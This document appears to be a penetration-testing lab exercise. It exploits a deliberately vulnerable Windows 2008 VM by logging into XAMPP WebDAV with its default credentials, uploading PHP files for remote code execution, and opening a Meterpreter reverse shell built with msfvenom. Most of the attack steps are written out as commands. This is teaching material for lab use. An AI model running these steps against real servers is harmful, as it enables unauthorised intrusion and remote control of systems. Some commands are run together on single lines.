
## Proj 12: Exploiting PHP Vulnerabilities
What you need
	• A Linux machine, real or virtual. I used a 32-bit Kali 2 virtual machine.
	• The Windows 2008 Server target VM you prepared previously, with many vulnerable programs running.
#### Purpose
To practice exploiting several vulnerabilities on the Target machine, including PHP vulnerabilities.
#### Start the VMs
Start both your Kali 2 VM and your Winows 2008 Server Target VM. Log in to both of them. Find the IP address of your target machine and make a note of it.
#### Test Networking
On the Kali machine, in a Terminal window, execute this command, replacing the IP address with the IP address of your Windows 2008 Server target.
			ping 192.168.119.130
You should see replies. If you don't, you need to troubleshoot your networking. If there's a firewall turned on on the target, turn it off. Press Ctrl+C to stop the pings.

### Task 1: Exploiting Default XAMPP Credentials
#### Scanning the Target with Nmap
On Kali, in a Terminal window, execute this command, replacing the IP address with the IP address of your Windows 2008 Server target. (The -A switch turns on all Advanced options, including banner-grabbing.)

		 		nmap -A 192.168.119.130

This took about 4 minutes when I did it, and showed a lot of these error messages: "WARNING: RST from 192.168.119.130 port 21 -- is this port really open?". Just ignore that and let the scan finish. When the scan is done, scroll back to see the results for port 80.
As shown below, the server supports DAV, and is running XAMPP version 1.7.2.

XAMPP is a LAMP server (Linux, Apache, MySQL, and PHP), containing many components bundled together for convenience.

As explained here, XAMPP turns on WebDAV by default, with default credentials of wampp and xampp. Often, a server administrator is not using WebDAV and is unaware that it's active, so the default credentials stay unchanged.
#### Uploading a File with Cadaver
Cadaver is a WebDAV utility, like a command-line FTP client. Kali includes it by default.
- On the Kali machine, in a Terminal window, execute this command, replacing the IP address with the IP address of your Windows 2008 Server target.

		cadaver http://192.168.119.130/webdav/
Log in with the credentials wampp and xampp, as shown below.

- At the "dav:/webdav/>" prompt, execute this command:

		help
You see a list of the available commands, including "put", which will upload a file to the server. On Kali, open a new Terminal window and execute this command:

	echo test > /tmp/test.htm
This creates a file named "test.htm". In your original Terminal window, at the "dav:/webdav/>" prompt, execute this command:

	put /tmp/test.htm
The file uploads, as shown below.

To see your file, on Kali, from the menu bar, click Applications, Favorites, IceWeasel, and enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.
	http://192.168.119.130/webdav/test.htm
The file appears, as shown below.

Now you can upload files to the server, and deface a Web page, but it would be even better to get a remote shell on the server.
## Code Execution with a PHP File
On your Kali box, in an unused Terminal window, execute this command:
	nano /tmp/phpinfo.php
In nano, enter this code, as shown below.
```
	<?php
phpinfo();
?>
```
Press Ctrl+X, Y, Enter to save the file.
This is a simple PHP file that displays information about the PHP software running on the server. If that file runs, it means that we can upload files and execute them on the server--"Remote Code Execution".
In your original Terminal window, at the "dav:/webdav/>" prompt, execute this command:
	put /tmp/phpinfo.php
The file uploads, as shown below.

In IceWeasel, enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.
```
http://192.168.119.130/webdav/phpinfo.php
```
The file appears, as shown below.

As you can see, we don't see the static text in the PHP file--the file's contents are executed and we see the output of the PHP function.
This means we can upload and execute PHP commands on the server.
All we need is a PHP file that does something fun.

#### Creating a PHP Attack File with Msfvenom
On your Kali box, in an unused Terminal window, execute this command:

		msfvenom -l | grep php
There are several PHP payloads available, including php/meterpreter_reverse_tcp, as shown below.

To see the options available for that exploit, execute this command:

		msfvenom -p php/meterpreter_reverse_tcp --payload-options
Scroll back to see the basic options, as shown below. The only options we really need are LHOST and LPORT, both referring to our Kali attacker.

On your Kali machine, execute this command. Find your IP address and make a note of it.

	ifconfig
On your Kali machine, execute these commands, replacing the IP address with the address of your Kali machine:

		msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.119.131 LPORT=443 -f raw > /tmp/meterpreter.php head /tmp/meterpreter.php
As shown below, the payload is long and filled with dense PHP code. Thanks to Metasploit, we don't need to understand all that code--we can just use it :).

#### Starting a Metasploit Listener
On your Kali machine, execute these commands, replacing the IP address with the address of your Kali machine:
```
	msfconsole use multi/handler
	set payload php/meterpreter_reverse_tcp
	set LHOST 192.168.119.131
	set LPORT 443 exploit
	```
Metasploit is now waiting for connections, as shown below.

#### Uploading and Executing the Attack File

In your original Terminal window, at the "dav:/webdav/>" prompt, execute this command:
	put /tmp/meterpreter.php
The file uploads, as shown below.

In IceWeasel, enter this URL, replacing the IP address with the IP address of your Windows 2008 Server target.

		http://192.168.119.130/webdav/meterpreter.php
The browser hangs, but the Matasploit listener shows a "Meterpreter session opened" message, as shown below. We now own the server!
